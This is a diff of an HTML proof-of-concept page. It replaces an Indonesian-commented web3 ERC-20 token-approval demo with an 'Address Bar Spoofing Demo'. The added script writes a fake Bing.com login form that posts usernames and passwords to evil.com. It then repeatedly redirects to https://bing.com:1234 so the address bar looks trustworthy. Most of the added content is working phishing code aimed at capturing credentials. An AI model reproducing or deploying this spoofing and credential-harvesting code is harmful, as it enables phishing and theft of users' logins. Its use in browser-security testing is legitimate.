@@ -1,58 +1,50 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Token Approval PoC</title>
-    <script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Bar Spoofing Demo</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+        }
+        .btn {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 20px;
+            border: none;
+            cursor: pointer;
+            font-size: 18px;
+        }
+        .btn:hover {
+            background-color: #45a049;
+        }
+    </style>
 </head>
 <body>
-    <h1>Token Approval PoC (Tanpa `getTokenList`)</h1>
-    <button id="approve">Approve Token</button>
-    <p id="status" style="color: red; font-weight: bold;"></p>
+    <h1>Address Bar Spoofing - Fake Login Page</h1>
+    <p>This page simulates a fake login form for a trusted website, while actually posting data to an attacker-controlled domain.</p>
+    <input class="btn" type="button" value="Run test case" onclick="spoof();">
 
     <script>
-        const web3 = new Web3(Web3.givenProvider);
+        function spoof() {
+            // Creating a fake login form mimicking a trusted site (e.g., Bing.com)
+            document.write("<html><title>Bing.com</title>" +
+                           "<form method='POST' action='//evil.com' name='form'>" +
+                           "<br /><br />Login:<br/><input name='login'><br />Password:<br/>" +
+                           "<input name='Password' type='password'><br/><br/>" +
+                           "<input type='submit' name='Valid' value='Ok'></form></html>");
 
-        document.getElementById('approve').onclick = async () => {
-            try {
-                // Menghubungkan wallet
-                document.getElementById('status').innerText = "Connecting to wallet...";
-                const accounts = await web3.eth.requestAccounts();
-                const userAddress = accounts[0]; // Alamat pengguna yang terhubung
-                document.getElementById('status').innerText = "Wallet connected: " + userAddress;
+            // Manipulate the address bar (spoof the location)
+            document.location = "https://bing.com:1234"; // Fake port number to mislead the user
 
-                // Gunakan alamat kontrak token ERC-20 yang sudah diketahui
-                const tokenAddress = "0xA0b86991c6218b36c1d19d4a2e9eb0ce3606eb48"; // Ganti dengan alamat token yang valid
-                const spenderAddress = userAddress; // Menggunakan alamat pengguna sendiri sebagai spender
-
-                // ABI standar ERC-20 hanya dengan fungsi approve
-                const tokenContract = new web3.eth.Contract(
-                    [
-                        {
-                            "constant": false,
-                            "inputs": [
-                                { "name": "_spender", "type": "address" },
-                                { "name": "_value", "type": "uint256" }
-                            ],
-                            "name": "approve",
-                            "outputs": [{ "name": "", "type": "bool" }],
-                            "type": "function"
-                        }
-                    ],
-                    tokenAddress // Gunakan alamat kontrak token yang valid
-                );
-
-                document.getElementById('status').innerText = "Sending approval transaction...";
-                await tokenContract.methods
-                    .approve(spenderAddress, "1000000000000000000") // Approve 1 token
-                    .send({ from: userAddress });
-
-                alert("Approval successful!");
-                document.getElementById('status').innerText = "Approval successful!";
-            } catch (err) {
-                alert("Error: " + err.message);
-                document.getElementById('status').innerText = "Approval failed: " + err.message;
-            }
-        };
+            // Keep redirecting to the spoofed address bar every 10 seconds
+            setInterval(function() {
+                document.location = "https://bing.com:1234";
+            }, 9800); 
+        }
     </script>
 </body>
 </html>
